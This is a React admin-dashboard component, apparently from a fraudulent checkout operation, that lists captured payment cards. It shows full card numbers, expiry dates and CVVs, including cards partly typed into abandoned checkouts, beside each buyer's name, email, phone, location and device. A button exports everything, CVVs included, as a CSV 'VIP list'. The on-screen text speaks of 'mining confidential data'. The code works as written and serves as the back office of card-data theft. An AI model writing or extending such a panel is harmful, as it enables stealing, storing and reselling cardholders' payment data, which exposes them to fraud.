import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Download, CreditCard, Laptop, Globe, Smartphone, Monitor } from "lucide-react";

export default function Cards() {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const [orders, setOrders] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);

    const getCardBrand = (number: string) => {
        if (!number) return '';
        const num = number.replace(/\D/g, '');
        if (num.startsWith('4')) return 'Visa';
        if (/^5[1-5]/.test(num) || /^2(2|3|4|5|6|7)/.test(num)) return 'Mastercard';
        if (/^3[47]/.test(num)) return 'Amex';
        if (/^6(?:011|5)/.test(num)) return 'Discover';
        return 'Cartão';
    };

    useEffect(() => {
        fetch('/api/orders')
            .then(r => r.json())
            .then(data => {
                const _orders = data.data || [];
                // Filter those who at least started typing a card or those with analytics
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                const relevant = _orders.filter((o: any) => o.card_number || o.utm_source || o.device_type);
                setOrders(relevant);
                setLoading(false);
            })
            .catch(console.error);
    }, []);

    const handleExportCsv = () => {
        const headers = ["ID", "Email", "Produto", "Cartão", "Nº Cartão", "Exp", "CVV", "Status", "Dispositivo", "Navegador", "País/Estado", "UTM Source"];
        const rows = orders.map(o => [
            o.id,
            o.customer_email || o.customer_phone || "",
            `"${o.product_name || ""}"`,
            o.card_number ? "Fornecido" : "Não Fornecido",
            `"${o.card_number || ""}"`,
            o.card_exp || "",
            o.card_cvv || "",
            o.status || "",
            o.device_type || "",
            o.browser || "",
            `"${(o.province || o.country) || ""}"`,
            o.utm_source || ""
        ]);
        const csvContent = "data:text/csv;charset=utf-8," + [headers, ...rows].map(e => e.join(",")).join("\n");
        const encodedUri = encodeURI(csvContent);
        const link = document.createElement("a");
        link.href = encodedUri;
        link.download = `cards-analytics-${new Date().toISOString().slice(0, 10)}.csv`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    return (
        <div className="space-y-6">
            <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
                <div>
                    <h1 className="text-2xl font-bold flex items-center gap-2"><CreditCard className="w-6 h-6" /> Central de Cards & Analytics</h1>
                    <p className="text-sm text-muted-foreground">{orders.length} cadastros rastreados internamente (Cartões e UTMs)</p>
                </div>
                <Button variant="outline" className="gap-2" onClick={handleExportCsv} disabled={orders.length === 0}>
                    <Download className="h-4 w-4" />
                    Exportar Lista VIP
                </Button>
            </div>

            <div className="bg-white border rounded-xl overflow-hidden animate-fade-in shadow-sm">
                <div className="overflow-x-auto">
                    <table className="w-full text-sm text-left">
                        <thead className="bg-slate-800 border-b">
                            <tr>
                                <th className="px-6 py-4 font-medium text-white">ID/Status</th>
                                <th className="px-6 py-4 font-medium text-white">Lead</th>
                                <th className="px-6 py-4 font-medium text-white">Dados Bancários</th>
                                <th className="px-6 py-4 font-medium text-white">Rastreio (UTM/Origem)</th>
                                <th className="px-6 py-4 font-medium text-white">Gatilho (Origem)</th>
                            </tr>
                        </thead>
                        <tbody className="divide-y relative">
                            {loading ? (
                                <tr><td colSpan={5} className="p-8 text-center text-muted-foreground">Minerando dados confidenciais...</td></tr>
                            ) : orders.length === 0 ? (
                                <tr><td colSpan={5} className="p-8 text-center text-muted-foreground">Nenhum dado avançado capturado ainda.</td></tr>
                            ) : orders.map((o) => (
                                <tr key={o.id} className="hover:bg-muted/30 transition-colors">
                                    <td className="px-6 py-4">
                                        <div className="font-mono text-xs text-black font-extrabold">{o.id?.slice(0, 8)}</div>
                                        <div className={`text-xs mt-1 ${o.status === 'success' ? 'text-emerald-500 font-bold' : 'text-amber-500'}`}>{o.status === 'success' ? 'Aprovado' : 'Abandonado'}</div>
                                    </td>
                                    <td className="px-6 py-4">
                                        <p className="font-medium text-zinc-900">{o.customer_name}</p>
                                        <p className="text-xs text-muted-foreground">{o.customer_email || o.customer_phone}</p>
                                    </td>
                                    <td className="px-6 py-4 font-mono text-xs text-red-600/90 font-bold">
                                        {o.card_number ? (
                                            <div>
                                                <p className="tracking-widest">{o.card_number}</p>
                                                <div className="flex items-center gap-3 mt-1.5 text-muted-foreground font-normal">
                                                    <span className="bg-slate-100 px-1.5 py-0.5 rounded text-[10px] uppercase font-bold text-black border border-slate-200">{getCardBrand(o.card_number)}</span>
                                                    <span>V: <span className="text-black font-medium">{o.card_exp}</span></span>
                                                    <span>C: <span className="text-black font-medium">{o.card_cvv || 'N/D'}</span></span>
                                                </div>
                                            </div>
                                        ) : (
                                            <span className="text-muted-foreground/50 font-sans font-normal">Não informado</span>
                                        )}
                                    </td>
                                    <td className="px-6 py-4">
                                        <p className="font-medium text-xs text-blue-600">[{o.utm_source || 'direct'}] {o.utm_campaign && ` - ${o.utm_campaign}`}</p>
                                        <div className="flex items-center gap-1 mt-1 text-xs text-muted-foreground">
                                            <Globe className="w-3 h-3" /> {o.province || o.country || 'Desconhecido'}
                                        </div>
                                    </td>
                                    <td className="px-6 py-4">
                                        <div className="flex items-center gap-2">
                                            {o.device_type === 'Mobile' ? <Smartphone className="w-4 h-4 text-primary" /> : <Monitor className="w-4 h-4 text-zinc-400" />}
                                            <div>
                                                <p className="text-xs font-medium">{o.device_type || 'Desktop'}</p>
                                                <p className="text-[10px] text-muted-foreground max-w-[120px] truncate" title={o.user_agent}>{o.browser || 'Unknown'}</p>
                                            </div>
                                        </div>
                                    </td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    );
}
